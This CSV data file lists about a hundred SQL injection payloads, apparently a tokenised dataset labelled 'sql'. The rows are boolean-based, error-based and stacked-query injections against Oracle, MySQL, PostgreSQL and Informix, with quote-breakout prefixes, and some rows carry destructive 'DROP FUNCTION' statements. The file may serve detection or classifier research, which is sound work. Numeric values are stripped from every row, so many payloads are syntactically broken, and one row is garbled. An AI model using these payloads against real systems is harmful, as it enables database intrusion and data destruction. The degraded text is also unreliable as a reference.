,language,source
4326,sql," ' ) ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ( ' jLWP ' = ' "
4327,sql," ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' xHtW ' = ' "
4328,sql," ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' MQHz ' = ' "
4329,sql," ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' eITw ' LIKE ' "
4330,sql," ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' fvbk ' LIKE ' "
4331,sql," ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' yaBz ' LIKE ' "
4332,sql," ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' zrYG ' LIKE ' "
4333,sql," ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' UJAl ' LIKE ' "
4334,sql," ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' OiSK ' LIKE ' "
4335,sql," "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( " hzxN " = " "
4336,sql," "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( " aeaM " = " "
4337,sql," "" ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( " Nmbi " = " "
4338,sql," "" ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( " spVU " = " "
4352,sql," % "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " % " = " "
4353,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4354,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4355,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4356,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4360,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4361,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
4362,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
4363,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  UNION ALL SELECT ) END ) ) "
4364,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  UNION ALL SELECT ) END ) ) "
4365,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL ) "
4366,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL ) "
4367,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE / END ) FROM SYSMASTER : SYSDUAL ) "
4368,sql," ( SELECT ( CASE WHEN ( = ) THEN  ELSE / END ) FROM SYSMASTER : SYSDUAL ) "
4369,sql,"IIF ( = , , / ) "
4370,sql,"IIF ( = , , / ) "
4371,sql," ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
4372,sql," ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
4373,sql," ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
4374,sql," ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
4375,sql," ( CASE WHEN = THEN  ELSE NULL END ) "
4376,sql," ( CASE WHEN = THEN  ELSE NULL END ) "
4387,sql," , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4388,sql," , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
4389,sql," ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
4390,sql," ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
4409,sql," ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4410,sql," ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4411,sql," ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4412,sql," ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4413,sql," ' ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4414,sql," ' ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4415,sql," ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4416,sql," ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4417,sql," ' ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4418,sql," ' ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4419,sql," "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4420,sql," "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4421,sql," "" ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4422,sql," "" ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4423,sql," "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4424,sql," "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4425,sql," % ' ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4426,sql," % ' ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4427,sql," % ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4428,sql," % ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4429,sql," % ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4430,sql," % ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4431,sql," % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4432,sql," % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
4433,sql," ) ; IF ( = ) SELECT  ELSE DROP FUNCTION shKP --"
4434,sql," ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
4435,sql," ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION euFA --"
4436,sql," ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
4456,sql," % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
4457,sql," % ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UsTT --"
4458,sql," % ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
4459,sql," % ' ; IF ( = ) SELECT  ELSE DROP FUNCTION yufd --"
4460,sql," % ' ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
4461,sql," % "" ; IF ( = ) SELECT  ELSE DROP FUNCTION BYZQ --"
4462,sql," % "" ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
4463,sql," ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )  -- "
4464,sql," ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( = "
4465,sql," ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( = "
4483,sql," % ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' % ' = ' "
4484,sql," % ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' % ' = ' "
4485,sql," % ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' "
4486,sql," % "" AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND " % " = " "
4487,sql," ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
4488,sql," ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( = "
4489,sql," ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( = "
4490,sql," ) ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ( = "
4491,sql," AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
4492,sql," AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
4493,sql," AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) # "
4494,sql," ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
4495,sql," ' ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ' Aokv ' = ' "
4496,sql," ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' pAma ' = ' "
4497,sql," ' ) ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ( ' Qojv ' = ' " ' = ' "
4509,sql," % ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' % ' = ' "
4510,sql," % "" AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND " % " = " "
4511,sql," ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
4512,sql," ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( = "
4513,sql," ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( = "
4528,sql," "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " APme " = " "
4529,sql," "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " lXRh " LIKE " "
4530,sql," "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " KCKZ " LIKE " "
4531,sql," % ' ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ' % ' = ' "
4532,sql," % ' ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ' % ' = ' "
4533,sql," % ' AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ' % ' = ' "
4534,sql," % "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " % " = " "
4553,sql," "" ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( " UjWz " LIKE " "
4554,sql," "" AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND " KNxh " LIKE " "
4555,sql," % ' ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ' % ' = ' "
4556,sql," % ' ) ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ( ' % ' = ' "
4557,sql," % ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ' % ' = ' "
4558,sql," % "" AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND " % " = " "
4559,sql," ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
4560,sql," ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( = "
